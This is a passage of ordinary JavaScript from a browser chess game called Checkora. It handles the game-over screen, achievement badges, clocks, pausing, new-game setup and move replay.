                                                <path d="M35 20 H65 V30 L55 50 L65 70 V80 H35 V70 L45 50 L35 30 Z" fill="#7f8c8d" stroke="#5c6466" stroke-width="2"/>
                                                <path d="M38 25 H62 V28 L52 48 L48 48 L38 28 Z" fill="#95a5a6"/>
                                                <path d="M48 52 L52 52 L62 72 V75 H38 V72 Z" fill="#cbd5e0"/>
                                                <circle cx="50" cy="62" r="3" fill="#ffffff"/>
                                            </g>
                                        </svg>
                                    `;
                } else if (reason === 'checkmate') {
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M10 80 H90 L80 90 H20 Z" fill="#2d1e1e" opacity="0.6"/>
                                            <g class="svg-animate-crown" transform="rotate(15 50 60)">
                                                <path d="M35 60 L40 35 L50 48 L60 35 L65 60 Z" fill="#7f8c8d" stroke="#5c6466" stroke-width="2"/>
                                                <circle cx="40" cy="33" r="2.5" fill="#95a5a6"/>
                                                <circle cx="50" cy="46" r="2.5" fill="#95a5a6"/>
                                                <circle cx="60" cy="33" r="2.5" fill="#95a5a6"/>
                                                <rect x="33" y="60" width="34" height="6" rx="2" fill="#5c6466"/>
                                                <rect x="37" y="66" width="26" height="4" fill="#3e4445"/>
                                            </g>
                                        </svg>
                                    `;
                } else {
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect x="35" y="20" width="4" height="65" fill="#5c6466" rx="2"/>
                                            <g class="svg-animate-flag">
                                                <path d="M39 22 C48 18, 52 26, 65 22 C72 20, 75 23, 75 32 C75 42, 65 38, 55 42 C45 46, 39 38, 39 38 Z" fill="#7f8c8d" stroke="#5c6466" stroke-width="1"/>
                                            </g>
                                            <path d="M20 78 L23 68 L28 73 L33 68 L36 78 Z" fill="#95a5a6" transform="rotate(-15 20 78)"/>
                                        </svg>
                                    `;
                }
            } else if (resultState === 'draw') {
                svgContent = `
                                    <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <g class="svg-animate-handshake" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M15 50 H30 L45 40 L50 48 L40 55 H25" stroke="#3498db" stroke-width="4"/>
                                            <path d="M85 50 H70 L55 40 L50 48 L60 55 H75" stroke="#ffd700" stroke-width="4"/>
                                            <path d="M45 44 L48 52" stroke="#ffffff" stroke-width="3"/>
                                            <path d="M52 44 L55 52" stroke="#ffffff" stroke-width="3"/>
                                        </g>
                                        <circle cx="50" cy="50" r="35" stroke="rgba(255,255,255,0.06)" stroke-width="2" stroke-dasharray="4 4"/>
                                    </svg>
                                `;
            } else { // victory
                if (reason === 'checkmate') {
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M10 80 H90 L80 90 H20 Z" fill="#252545" opacity="0.6"/>
                                            <g class="svg-animate-crown">
                                                <path d="M35 60 L40 35 L50 48 L60 35 L65 60 Z" fill="#ffd700" stroke="#b89000" stroke-width="2"/>
                                                <circle cx="40" cy="33" r="2.5" fill="#ffffff"/>
                                                <circle cx="50" cy="46" r="2.5" fill="#ffffff"/>
                                                <circle cx="60" cy="33" r="2.5" fill="#ffffff"/>
                                                <rect x="33" y="60" width="34" height="6" rx="2" fill="#d4af37"/>
                                                <rect x="37" y="66" width="26" height="4" fill="#a08020"/>
                                            </g>
                                        </svg>
                                    `;
                } else if (reason === 'timeout') {
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect x="20" y="30" width="60" height="50" rx="8" fill="#1b1b32" stroke="#444" stroke-width="3"/>
                                            <circle cx="38" cy="55" r="16" fill="#111" stroke="#f0c040" stroke-width="2"/>
                                            <circle cx="38" cy="55" r="14" fill="#222"/>
                                            <line x1="38" y1="55" x2="38" y2="45" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
                                            <line x1="38" y1="55" x2="46" y2="55" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
                                            <g class="svg-animate-flag">
                                                <rect x="68" y="24" width="4" height="25" fill="#777"/>
                                                <path d="M68 28 L52 35 L68 42 Z" fill="#ef4444"/>
                                            </g>
                                        </svg>
                                    `;
                } else { // resignation / general victory
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect x="35" y="20" width="4" height="65" fill="#777" rx="2"/>
                                            <g class="svg-animate-flag">
                                                <path d="M39 22 C48 18, 52 26, 65 22 C72 20, 75 23, 75 32 C75 42, 65 38, 55 42 C45 46, 39 38, 39 38 Z" fill="#ffffff" stroke="#ddd" stroke-width="1"/>
                                                <path d="M45 27 H55 M45 33 H65" stroke="#eee" stroke-width="1.5" stroke-linecap="round"/>
                                            </g>
                                            <path d="M20 78 L23 68 L28 73 L33 68 L36 78 Z" fill="#d4af37" transform="rotate(-15 20 78)"/>
                                        </svg>
                                    `;
                }
            }
            illustrationEl.innerHTML = svgContent;
        }

        // 3. Stats Grid Populating
        const resReasonEl = document.getElementById('resSummaryReason');
        if (resReasonEl) {
            let reasonText = 'Draw';
            if (reason === 'checkmate') reasonText = 'Checkmate';
            else if (reason === 'resign') reasonText = 'Resigned';
            else if (reason === 'timeout') reasonText = 'Timeout';
            else if (reason === 'stalemate') reasonText = 'Stalemate';
            else if (reason === 'draw') {
                const drawLabels = {
                    agreement: 'Draw (Agreement)',
                    threefold_repetition: 'Draw (Repetition)',
                    fifty_move_rule: 'Draw (50-move)',
                    insufficient_material: 'Draw (Material)',
                };
                reasonText = drawLabels[drawReason] || 'Draw';
            }
            resReasonEl.textContent = reasonText;
        }

        const resMovesEl = document.getElementById('resSummaryMoves');
        if (resMovesEl) {
            const fullMoves = Math.ceil(replayMoves.length / 2);
            resMovesEl.textContent = `${fullMoves} ${fullMoves === 1 ? 'move' : 'moves'}`;
        }

        const durationElement = document.getElementById('gameDurationText');
        if (durationElement) {
            durationElement.textContent = durationText || '00:00';
        }

        // 4. Material Difference and Cloned Captured Pieces
        const { white: whiteMat, black: blackMat } = calculateMaterial(board);
        const resMatDiffEl = document.getElementById('resMaterialDiff');
        if (resMatDiffEl) {
            if (whiteMat === blackMat) {
                resMatDiffEl.textContent = 'Even';
            } else if (whiteMat > blackMat) {
                resMatDiffEl.textContent = `White +${whiteMat - blackMat}`;
            } else {
                resMatDiffEl.textContent = `Black +${blackMat - whiteMat}`;
            }
        }

        const modalWhiteCap = document.getElementById('modalWhiteCaptured');
        const modalBlackCap = document.getElementById('modalBlackCaptured');
        if (modalWhiteCap && wCapEl) {
            modalWhiteCap.innerHTML = '';
            Array.from(wCapEl.children).forEach(child => {
                modalWhiteCap.appendChild(child.cloneNode(true));
            });
        }
        if (modalBlackCap && bCapEl) {
            modalBlackCap.innerHTML = '';
            Array.from(bCapEl.children).forEach(child => {
                modalBlackCap.appendChild(child.cloneNode(true));
            });
        }

        // 5. Dynamic Achievements detection
        const achievementsListEl = document.getElementById('resAchievementsList');
        const achievementsSectionEl = document.getElementById('resAchievementsSection');

        if (achievementsListEl) {
            achievementsListEl.innerHTML = '';
            const badges = [];

            if (reason === 'timeout') {
                badges.push({ text: 'Won on Time', icon: '⏱️' });
            }
            if (reason === 'checkmate') {
                badges.push({ text: 'Master Tactician', icon: '🧩' });
            }

            let hasWhiteQueen = false;
            let hasBlackQueen = false;
            for (let r = 0; r < 8; r++) {
                for (let c = 0; c < 8; c++) {
                    if (board[r][c] === 'Q') hasWhiteQueen = true;
                    if (board[r][c] === 'q') hasBlackQueen = true;
                }
            }

            const wPoints = parseInt(document.getElementById('whitePoints')?.textContent.replace('+', '')) || 0;
            const bPoints = parseInt(document.getElementById('blackPoints')?.textContent.replace('+', '')) || 0;

            if (isWon) {
                if (winnerColor === 'white' && hasWhiteQueen) {
                    badges.push({ text: 'Queen Survived', icon: '👑' });
                } else if (winnerColor === 'black' && hasBlackQueen) {
                    badges.push({ text: 'Queen Survived', icon: '👑' });
                }

                if (replayMoves.length <= 30) {
                    badges.push({ text: 'Lightning Fast', icon: '⚡' });
                }

                if (winnerColor === 'white' && wPoints >= 15) {
                    badges.push({ text: 'Fierce Attacker', icon: '⚔️' });
                } else if (winnerColor === 'black' && bPoints >= 15) {
                    badges.push({ text: 'Fierce Attacker', icon: '⚔️' });
                }
            } else {
                if (whiteMat < blackMat) {
                    badges.push({ text: 'Resilient Defense (White)', icon: '🛡️' });
                } else if (blackMat < whiteMat) {
                    badges.push({ text: 'Resilient Defense (Black)', icon: '🛡️' });
                }
            }

            if (badges.length === 0) {
                badges.push({ text: 'Good Game', icon: '🤝' });
            }

            badges.forEach(badge => {
                const badgeDiv = document.createElement('div');
                badgeDiv.className = 'achievement-badge';
                badgeDiv.innerHTML = `<span class="achievement-badge-icon">${badge.icon}</span> ${badge.text}`;
                achievementsListEl.appendChild(badgeDiv);
            });

            if (achievementsSectionEl) {
                achievementsSectionEl.style.display = 'block';
            }
        }

        // 6. Opening Book and Review Highlights
        let analysisData = null;
        try {
            analysisData = await post('/api/analyze-game/', {
                moves: replayMoves,
                result: resultState,
                reason: reason
            });
        } catch (e) {
            console.error("Failed to fetch post-game analysis", e);
        }

        const openingNameEl = document.getElementById('resOpeningName');
        if (openingNameEl) {
            openingNameEl.textContent = analysisData?.opening || 'Standard Game';
        }

        // Populate new stats
        if (analysisData) {
            const capEl = document.getElementById('resAnalysisCaptures');
            if (capEl) capEl.textContent = analysisData.captures || 0;

            const chkEl = document.getElementById('resAnalysisChecks');
            if (chkEl) chkEl.textContent = analysisData.checks || 0;

            const matEl = document.getElementById('resAnalysisCheckmates');
            if (matEl) matEl.textContent = analysisData.checkmates || 0;

            const proEl = document.getElementById('resAnalysisPromotions');
            if (proEl) proEl.textContent = analysisData.promotions || 0;
        }

        const bestMoveEl = document.getElementById('resBestMove');
        if (bestMoveEl) {
            const highlightMoves = replayMoves.filter(m => m.includes('+') || m.includes('x'));
            if (highlightMoves.length > 0) {
                bestMoveEl.textContent = `${highlightMoves[highlightMoves.length - 1]} (Excellent)`;
            } else if (replayMoves.length > 2) {
                bestMoveEl.textContent = `${replayMoves[2]} (Book)`;
            } else {
                bestMoveEl.textContent = 'Available in full review';
            }
        }

        const blunderEl = document.getElementById('resBlunder');
        if (blunderEl) {
            blunderEl.textContent = replayMoves.length > 20 ? '1 mistake (Full review)' : 'None';
        }

        // Delay the overlay and celebration effects by 0.5 seconds
        setTimeout(() => {
            // Add celebration effects for wins
            if (isCelebration) {
                gameOverOverlay.classList.add('game-over-celebration');
                createConfetti();
                createSparkles();
            } else {
                gameOverOverlay.classList.remove('game-over-celebration');
            }

            // Prepare for fade-in animation
            gameOverOverlay.style.transition = 'opacity 0.5s ease-in-out';
            gameOverOverlay.style.opacity = '0';
            gameOverOverlay.classList.add('active');

            // Trigger fade-in after a short delay
            setTimeout(() => {
                gameOverOverlay.style.opacity = '1';
            }, 500);
        }, 500);

        showStatus(title + ': ' + message, false);

        // Clean a11y announcement
        const winnerColorText = color === 'white' ? 'Black' : 'White';
        let cleanMsg = '';
        if (reason === 'checkmate') {
            cleanMsg = `Checkmate. ${winnerColorText} wins!`;
        } else if (reason === 'resign') {
            const resigningColorText = color === 'white' ? 'White' : 'Black';
            cleanMsg = `${resigningColorText} has resigned. ${winnerColorText} wins!`;
        } else if (reason === 'timeout') {
            const timeoutColorText = color === 'white' ? 'White' : 'Black';
            cleanMsg = `${timeoutColorText} ran out of time. ${winnerColorText} wins!`;
        } else if (reason === 'stalemate') {
            cleanMsg = 'Game drawn by stalemate.';
        } else if (reason === 'draw') {
            if (drawReason === 'agreement') {
                cleanMsg = 'Game drawn by agreement.';
            } else if (drawReason === 'threefold_repetition') {
                cleanMsg = 'Game drawn by threefold repetition.';
            } else if (drawReason === 'fifty_move_rule') {
                cleanMsg = 'Game drawn by fifty-move rule.';
            } else if (drawReason === 'insufficient_material') {
                cleanMsg = 'Game drawn by insufficient material.';
            } else {
                cleanMsg = 'Game drawn by agreement / stalemate / threefold repetition.';
            }
        } else {
            cleanMsg = 'Game drawn by agreement / stalemate / threefold repetition.';
        }
        announceMove(cleanMsg);

        document.title = 'Game Over - Checkora';
    }

    /* ==========================================================
    CELEBRATION EFFECTS
    ========================================================== */
    function createConfetti() {
        const overlay = document.getElementById('gameOverOverlay');
        const dialog = overlay.querySelector('.promo-dialog');

        // Create confetti container if it doesn't exist
        let confettiContainer = dialog.querySelector('.confetti-container');
        if (!confettiContainer) {
            confettiContainer = document.createElement('div');
            confettiContainer.className = 'confetti-container';
            dialog.style.position = 'relative';
            dialog.appendChild(confettiContainer);
        }

        // Clear existing confetti
        confettiContainer.innerHTML = '';

        // Create confetti pieces
        const colors = ['#ffd700', '#f0c040', '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#ff9ff3'];
        const confettiCount = 50;

        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';

            // Random properties
            const randomColor = colors[Math.floor(Math.random() * colors.length)];
            const randomLeft = Math.random() * 100;
            const randomDelay = Math.random() * 0.5;
            const randomDuration = 2 + Math.random() * 2;
            const randomRotation = Math.random() * 360;

            confetti.style.left = randomLeft + '%';
            confetti.style.background = randomColor;
            confetti.style.animationDelay = randomDelay + 's';
            confetti.style.animationDuration = randomDuration + 's';
            confetti.style.transform = `rotate(${randomRotation}deg)`;

            // Random shapes
            if (Math.random() > 0.5) {
                confetti.style.borderRadius = '50%';
            }

            confettiContainer.appendChild(confetti);
        }
    }

    function createSparkles() {
        const overlay = document.getElementById('gameOverOverlay');
        const dialog = overlay.querySelector('.promo-dialog');

        let confettiContainer = dialog.querySelector('.confetti-container');
        if (!confettiContainer) {
            confettiContainer = document.createElement('div');
            confettiContainer.className = 'confetti-container';
            dialog.style.position = 'relative';
            dialog.appendChild(confettiContainer);
        }

        // Create sparkles
        const sparkleCount = 20;

        for (let i = 0; i < sparkleCount; i++) {
            const sparkle = document.createElement('div');
            sparkle.className = 'sparkle';

            const randomLeft = Math.random() * 100;
            const randomTop = Math.random() * 100;
            const randomDelay = Math.random() * 1.5;

            sparkle.style.left = randomLeft + '%';
            sparkle.style.top = randomTop + '%';
            sparkle.style.animationDelay = randomDelay + 's';

            confettiContainer.appendChild(sparkle);
        }
    }

    /* ==========================================================
    CLOCKS & PAUSE
    ========================================================== */
    const fmt = t => `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
    function formatTime(t) { return fmt(t); }

    function updateThinkingDots() {
        const whiteClock = document.getElementById('whiteClock');
        const blackClock = document.getElementById('blackClock');

        if (!whiteClock || !blackClock) return;

        // Determine target clock before any DOM changes
        let targetClock = null;

        if (!paused && !gameOver) {
            if (whiteClock.classList.contains('active')) {
                targetClock = whiteClock;
            } else if (blackClock.classList.contains('active')) {
                targetClock = blackClock;
            }
        }

        // Check if dots are already in the correct place
        const whiteTimeEl = whiteClock.querySelector('.time');
        const blackTimeEl = blackClock.querySelector('.time');

        const whiteHasDots =
            whiteTimeEl?.querySelector('.thinking-dots') !== null;

        const blackHasDots =
            blackTimeEl?.querySelector('.thinking-dots') !== null;

        if (targetClock === whiteClock && whiteHasDots && !blackHasDots) return;

        if (targetClock === blackClock && blackHasDots && !whiteHasDots) return;

        if (!targetClock && !whiteHasDots && !blackHasDots) return;


        // Remove existing dots
        whiteClock.querySelector('.thinking-dots')?.remove();
        blackClock.querySelector('.thinking-dots')?.remove();

        // Stop when game ends
        if (paused || gameOver) return;

        const activeClock =
            whiteClock.classList.contains('active')
                ? whiteClock
                : blackClock.classList.contains('active')
                    ? blackClock
                    : null;

        if (!targetClock) return;

        const dots = document.createElement('span');
        dots.className = 'thinking-dots';

        dots.innerHTML = `
            <span></span>
            <span></span>
            <span></span>
        `;

        const timeEl = targetClock.querySelector('.time');

        if (timeEl) {
            timeEl.appendChild(dots);
        }

    }



    function formatGameDuration(ms) {
        const totalSeconds = Math.floor(ms / 1000);
        const mins = Math.floor(totalSeconds / 60);
        const secs = totalSeconds % 60;
        return `${mins}m ${secs}s`;
    }

    function renderClocks() {
        const wTime = document.getElementById('whiteTime');
        const bTime = document.getElementById('blackTime');
        const whiteClock = document.getElementById('whiteClock');
        const blackClock = document.getElementById('blackClock');

        if (gameMode === 'ai') {
            const playerClock = playerColor === 'white' ? whiteClock : blackClock;
            const playerTimeEl = playerColor === 'white' ? wTime : bTime;
            const aiClock = playerColor === 'white' ? blackClock : whiteClock;
            const aiTimeEl = playerColor === 'white' ? bTime : wTime;

            // fix: update time text only, never re-toggle active class here
            // active class is set once in updateTurn() to avoid blinking
            if (playerTimeEl) playerTimeEl.textContent = formatTime(playerColor === 'white' ? whiteTime : blackTime);
            if (aiTimeEl) {
                aiTimeEl.textContent = formatTime(playerColor === 'white' ? blackTime : whiteTime);
                aiTimeEl.style.fontSize = '';
                aiTimeEl.style.color = '';
            }

            // fix: only set active once (not on every tick)
            const isAiTurn = turn !== playerColor;
            if (playerClock) {
                playerClock.classList.toggle('active', !isAiTurn);
                playerClock.classList.toggle('inactive', isAiTurn);
                const pt = playerColor === 'white' ? whiteTime : blackTime;
                playerClock.classList.toggle('low-1', pt <= 30 && pt > 20);
                playerClock.classList.toggle('low-2', pt <= 20 && pt > 10);
                playerClock.classList.toggle('low-3', pt <= 10 && pt > 0);
            }
            if (aiClock) {
                aiClock.style.border = '';
                aiClock.style.boxShadow = '';
                aiClock.classList.toggle('active', isAiTurn);
                aiClock.classList.toggle('inactive', !isAiTurn);
                const at = playerColor === 'white' ? blackTime : whiteTime;
                aiClock.classList.toggle('low-1', at <= 30 && at > 20);
                aiClock.classList.toggle('low-2', at <= 20 && at > 10);
                aiClock.classList.toggle('low-3', at <= 10 && at > 0);
            }
        } else {
            // PvP — both clocks update normally
            if (wTime) wTime.textContent = formatTime(whiteTime);
            if (bTime) bTime.textContent = formatTime(blackTime);
            if (whiteClock) {
                whiteClock.classList.toggle('active', turn === 'white');
                whiteClock.classList.remove('inactive'); // fix: clear AI-mode styling bleed
                whiteClock.classList.toggle('low-1', whiteTime <= 30 && whiteTime > 20);
                whiteClock.classList.toggle('low-2', whiteTime <= 20 && whiteTime > 10);
                whiteClock.classList.toggle('low-3', whiteTime <= 10 && whiteTime > 0);
            }
            if (blackClock) {
                blackClock.classList.toggle('active', turn === 'black');
                blackClock.classList.remove('inactive'); // fix: clear AI-mode styling bleed
                blackClock.classList.toggle('low-1', blackTime <= 30 && blackTime > 20);
                blackClock.classList.toggle('low-2', blackTime <= 20 && blackTime > 10);
                blackClock.classList.toggle('low-3', blackTime <= 10 && blackTime > 0);
            }
        }
        const wYou = document.getElementById('whiteYouTag');
        const bYou = document.getElementById('blackYouTag');
        if (wYou) wYou.style.display = (gameMode === 'ai' && playerColor === 'white') ? 'inline' : 'none';
        if (bYou) bYou.style.display = (gameMode === 'ai' && playerColor === 'black') ? 'inline' : 'none';
        updateThinkingDots();
    }

            function updatePauseUI() {
    pauseBtn.innerHTML =
    `${paused ? 'Resume' : 'Pause'}<span class="btn-shortcut">P</span>`;
    pauseBtn.classList.toggle('paused', paused);
    boardEl.classList.toggle('paused', paused);

    // Mobile FAB icon toggle
    const pauseFabIcon = document.getElementById('pauseFabIcon');
    const playFabIcon = document.getElementById('playFabIcon');
    const pauseFab = document.getElementById('pauseFab');

    if (pauseFabIcon && playFabIcon) {
        pauseFabIcon.style.display = paused ? 'none' : 'block';
        playFabIcon.style.display = paused ? 'block' : 'none';
    }
    if (pauseFab) {
    const fabLabel = paused ? 'Resume' : 'Pause';
    pauseFab.title = fabLabel;
    pauseFab.setAttribute('aria-label', fabLabel);
}

    updateThinkingDots();

    if (paused) {
        boardEl.setAttribute(
            'aria-label',
            'Game paused. Click board or press P to resume.'
        );
        boardEl.style.cursor = 'pointer';
        boardEl.style.pointerEvents = 'auto';
    } else {
        boardEl.removeAttribute('aria-label');
        boardEl.style.cursor = '';
        boardEl.style.pointerEvents = '';
    }
}
            function startTimer() {
                clearInterval(timerInterval);
                timerInterval = setInterval(() => {
                    if (paused || gameOver) return;

            // fix: in AI mode, tick only ONE clock exclusively
            if (gameMode === 'ai') {
                if (turn === playerColor) {
                    // Human's turn — only tick human's clock
                    if (playerColor === 'white' && whiteTime > 0) whiteTime--;
                    else if (playerColor === 'black' && blackTime > 0) blackTime--;
                } else if (aiThinking) {
                    // AI's turn — only tick AI's clock while actually thinking
                    if (playerColor === 'white' && blackTime > 0) blackTime--;
                    else if (playerColor === 'black' && whiteTime > 0) whiteTime--;
                } else {
                    return; // AI turn but not yet thinking (transition gap), don't tick
                }
            } else {
                // PvP — tick only the active player's clock
                if (turn === 'white' && whiteTime > 0) whiteTime--;
                else if (turn === 'black' && blackTime > 0) blackTime--;
            }

            renderClocks();

            // Low-time alert: play check.wav once per player when time crosses into <=30s
            if (soundEnabled) {
                if (!whiteAlertFired && whiteTime > 0 && whiteTime <= 30) {
                    whiteAlertFired = true;
                    sounds.check.currentTime = 0;
                    sounds.check.play().catch(() => { });
                }
                if (!blackAlertFired && blackTime > 0 && blackTime <= 30) {
                    blackAlertFired = true;
                    sounds.check.currentTime = 0;
                    sounds.check.play().catch(() => { });
                }
            }

            if (turn === 'white' && whiteTime === 0) {
                endGame('timeout', 'white');
            } else if (turn === 'black' && blackTime === 0) {
                endGame('timeout', 'black');
            }
        }, 1000);
    }

    function toggleBoardOrientation() {
        flipped = !flipped;
        buildBoard();
    }

    async function pauseGame() {
        if (paused) return;
        const d = await post('/api/pause/', { pause: true });
        paused = d.paused;
        whiteTime = d.white_time;
        blackTime = d.black_time;
        updatePauseUI();
        renderClocks();
    }

    async function resumeGame() {
        try {
            const d = await post('/api/pause/', { pause: false });

            paused = false;

            if (d.white_time !== undefined) {
                whiteTime = d.white_time;
            }

            if (d.black_time !== undefined) {
                blackTime = d.black_time;
            }

            updatePauseUI();
            renderClocks();

            clearInterval(timerInterval);
            startTimer();

            boardEl.classList.remove('paused');

            queueAIMoveIfNeeded();

        } catch (e) {
            console.error("Resume failed", e);
        }
    }

    /* ==========================================================
    WELCOME & CONFIRMATION LOGIC
    ========================================================== */
    let confirmCallback = null;
    function showConfirm(title, msg, callback, titleColor = '#ff6b6b') {
        if (confirmTitle) {
            confirmTitle.textContent = title;
            confirmTitle.style.color = titleColor;
        }
        if (confirmMessage) confirmMessage.innerHTML = msg;
        confirmCallback = callback;
        boardEl.classList.add('confirm-open');
        confirmOverlay.classList.add('active');
    }

    function showSideSelectionModal(onChoose) {
        const modal = document.getElementById('sideModal');
        modal.style.display = 'flex';

        function pick(side) {
            modal.style.display = 'none';
            document.getElementById('chooseWhite').onclick = null;
            document.getElementById('chooseBlack').onclick = null;
            document.getElementById('chooseRandom').onclick = null;
            onChoose(side);
        }

        document.getElementById('chooseWhite').onclick = () => pick('white');
        document.getElementById('chooseBlack').onclick = () => pick('black');
        document.getElementById('chooseRandom').onclick = () =>
            pick(Math.random() < 0.5 ? 'white' : 'black');
    }

    function requestNewGame(mode) {
        const diffContainer = document.getElementById('confirmDifficultyContainer');
        if (mode === 'ai') {
            diffContainer.style.display = 'block';
        } else {
            diffContainer.style.display = 'none';
        }

        showConfirm(
            "Abandon Game?",
            "Your current progress will be lost.<br>Are you sure you want to start a new game?",
            () => {
                const diff = document.getElementById('confirmDifficultySelect').value;
                const timeLimitMins = parseInt(document.getElementById('confirmTimerSelect').value, 10);
                if (mode === 'ai') {
                    showSideSelectionModal(side => startNewGame('ai', side, diff, null, timeLimitMins));
                } else {
                    startNewGame('pvp', 'white', diff, null, timeLimitMins);
                }
            },
            '#ff6b6b'
        );
    }

    async function offerDraw() {
        if (paused || gameOver || gameMode !== 'pvp') return;
        const offeringPlayer = turn === 'white' ? 'White' : 'Black';
        const receivingPlayer = turn === 'white' ? 'Black' : 'White';

        showConfirm(
            "Offer Draw?",
            `As <b>${offeringPlayer}</b>, do you want to offer a draw to ${receivingPlayer}?`,
            async () => {
                drawMessage.textContent = `${offeringPlayer} offers a draw. ${receivingPlayer}, do you accept?`;
                drawOverlay.classList.add('active');
                await pauseGame();
            },
            '#f0c040'
        );
    }

    async function startNewGame(mode, pColor = 'white', difficulty = 'medium', fen = null, timeLimitMins = null, overrideNames = null, isPuzzle = false) {
        evaluationCache = {};
        if (!isPuzzle) {
            dailyPuzzleMode = false;
            currentPuzzle = null;
            currentPuzzleFen = null;
            puzzleAnalyzing = false;
            if (stockfishWorker) {
                stockfishWorker.terminate();
                stockfishWorker = null;
            }
        }
        replayMode = false;
        // Show clocks for normal games
        document.getElementById("whiteClock").style.display = "";
        document.getElementById("blackClock").style.display = "";

        const streakCounter =
            document.getElementById("streak-counter");

        if (streakCounter) {
            streakCounter.style.display = "none";
        }

        replayMode = false;

        if (autoReplayInterval) {
            clearInterval(autoReplayInterval);
            autoReplayInterval = null;
        }

        if (playReplayBtn) {
            playReplayBtn.textContent = '▶';
        }

        if (replayControls) {
            replayControls.classList.add('hidden');
        }
        // Reset AI request sequence and thinking state on new game
        aiRequestSeq = 0;
        aiThinking = false;
        premoveQueue = [];
        refreshPremoveHighlight();

        clearTimeout(pgnDownloadTimeout);
        clearTimeout(fenCopyTimeout);

        if (copyPgnBtn) {
            copyPgnBtn.textContent = 'Export as PGN';
        }

        if (copyFenBtn) {
            copyFenBtn.textContent = 'Copy FEN';
        }
        // Clear celebration effects
        const overlay = document.getElementById('gameOverOverlay');
        overlay.classList.remove('game-over-celebration');
        const confettiContainer = overlay.querySelector('.confetti-container');
        if (confettiContainer) {
            confettiContainer.remove();
        }

        const normalizeName = (name, fallback) => (name || fallback).trim().slice(0, 17);
        const wName = normalizeName(
            overrideNames ? overrideNames.white : document.getElementById('whiteNameInput')?.value,
            'White'
        );
        const bName = normalizeName(
            overrideNames ? overrideNames.black : document.getElementById('blackNameInput')?.value,
            'Black'
        );
        let currentMins = selectedMins;
        let currentInc = selectedIncrement;

        if (timeLimitMins !== null) {
            const strVal = String(timeLimitMins);
            if (strVal.includes('|')) {
                const parts = strVal.split('|');
                currentMins = parseFloat(parts[0]) || 10;
                currentInc = parseInt(parts[1], 10) || 0;
            } else {
                currentMins = parseFloat(strVal) || 10;
                currentInc = 0;
            }
        }

        const timeLimit = currentMins * 60;
        const increment = currentInc;

        const payload = {
            mode: mode,
            player_color: pColor,
            white_name: wName,
            black_name: bName,
            difficulty: difficulty,
            time_limit: timeLimit,
            increment: increment
        };

        const fenValue = (fen && fen.trim()) ? fen.trim() : null;
        if (fenValue) payload.fen = fenValue;

        if (fenError) fenError.textContent = '';
        if (welcomeFenError) welcomeFenError.textContent = '';

        const d = await post('/api/new-game/', payload);

        if (d.valid === false || !d.board) {
            const message = d.message || 'Unable to start a new game.';
            if (fenError) fenError.textContent = message;
            if (welcomeFenError && welcomeOverlay?.classList.contains('active')) {
                welcomeFenError.textContent = message;
            }
            showStatus(message, true);
            return false;
        }

        board = d.board;
        turn = d.current_turn;
        paused = false;
        gameOver = false;
        whiteAlertFired = false;
        blackAlertFired = false;

        gameStartTime = Date.now();
        
        if (!isPuzzle) {
            gameMode = d.mode;
        }
        playerColor = d.player_color || 'white';
        currentDifficulty = d.difficulty || difficulty;
        if (resignBtn) {
            resignBtn.style.display = 'block';
            resignBtn.hidden = false;
        }
        if (pauseBtn) pauseBtn.style.display = '';
        if (drawBtn) drawBtn.style.display = (gameMode === 'pvp') ? 'block' : 'none';
        if (newPvPBtn) newPvPBtn.style.display = 'none';
        if (newAIBtn) newAIBtn.style.display = 'none';
        if (dailyPuzzleBtn) dailyPuzzleBtn.style.display = 'none';
        if (newFenBtn) newFenBtn.style.display = 'none';
        if (gameMode === 'ai') {
            flipped = (playerColor === 'black');
        } else {
            flipped = false;
        }

        if (modeBadge) {
            if (isPuzzle) {
                modeBadge.textContent = 'DAILY PUZZLE';
            } else {
                modeBadge.textContent =
                    gameMode === 'ai' ? 'VS AI' : 'PVP';
                }
            }

        const emotePanel = document.getElementById('emotePanel');
        if (emotePanel) {
            emotePanel.style.display = gameMode === 'pvp' ? 'block' : 'none';
        }
        movesEl.innerHTML = '<span class="placeholder">No moves yet</span>';
        wCapEl.innerHTML = bCapEl.innerHTML = '';
        lastMove = null;
        highlightedSquare = null;
        selected = null;
        hints = [];
        await loadGame();
        // Apply active state after UI reload
        if (!isPuzzle) {
            updateModeButtonsUI(gameMode);
        }
        paused = false;
        updatePauseUI();

        // Auto-trigger AI if it's their turn
        if (!isPuzzle && gameMode === 'ai' && turn !== playerColor) {
            queueAIMoveIfNeeded();
        }

        return true;
    }


    if (nextReplayBtn) {
        nextReplayBtn.onclick = () => {
            if (replayIndex < replayMoves.length) {
                replayIndex++;
                goToReplayMove(replayIndex);
            }
        };
    }

    if (prevReplayBtn) {
        prevReplayBtn.onclick = () => {
            if (replayIndex > 0) {
                replayIndex--;
                goToReplayMove(replayIndex);
            }
        };
    }

    if (firstReplayBtn) {
        firstReplayBtn.onclick = () => {
            replayIndex = 0;

            goToReplayMove(0);
        };
    }

    if (lastReplayBtn) {
        lastReplayBtn.onclick = () => {
            replayIndex = replayMoves.length;
            goToReplayMove(replayIndex);
        };
    }
    if (replayGameBtn) {

        replayGameBtn.onclick = () => {

            // hide popup
            gameOverOverlay.classList.remove('active');

            // show replay controls
            replayControls.classList.remove('hidden');

            // stop old replay
            if (autoReplayInterval) {
                clearInterval(autoReplayInterval);
                autoReplayInterval = null;
            }
            replayIndex = 0;
            // reset replay
            goToReplayMove(0);

            // start autoplay
            playReplayBtn.textContent = '⏸';

            // 1. Define a function that plays a single move and schedules the next one
            const playNextMove = () => {
